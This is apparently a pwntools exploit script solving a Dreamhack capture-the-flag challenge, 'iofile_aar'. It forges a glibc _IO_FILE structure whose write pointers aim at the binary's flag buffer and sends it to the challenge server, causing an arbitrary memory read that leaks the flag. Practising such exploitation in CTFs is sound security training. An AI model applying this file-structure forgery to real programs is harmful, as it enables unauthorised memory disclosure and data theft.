#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aar_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 24549)

    return r


def main():
    r = conn()

    payload = p64(0xfbad0000 | 0x800)                       # _flags
    payload += p64(0)                                       # _IO_read_ptr
    payload += p64(exe.symbols["flag_buf"])                 # _IO_read_end
    payload += p64(0)                                       # _IO_read_base
    payload += p64(exe.symbols["flag_buf"])                 # _IO_write_base
    payload += p64(exe.symbols["flag_buf"] + 1024)          # _IO_write_ptr
    payload += p64(0)                                       # _IO_write_end
    payload += p64(0)                                       # _IO_buf_base
    payload += p64(0)                                       # _IO_buf_end
    payload += p64(0)                                       # _IO_save_base
    payload += p64(0)                                       # _IO_backup_base
    payload += p64(0)                                       # _IO_save_end
    payload += p64(0)                                       # _markers
    payload += p64(0)                                       # _chain
    payload += p64(1)                                       # _fileno

    r.sendafter(b"Data: ", payload)

    flag = r.recvline()
    log.success(f"flag: {flag.decode()}")



if __name__ == "__main__":
    main()
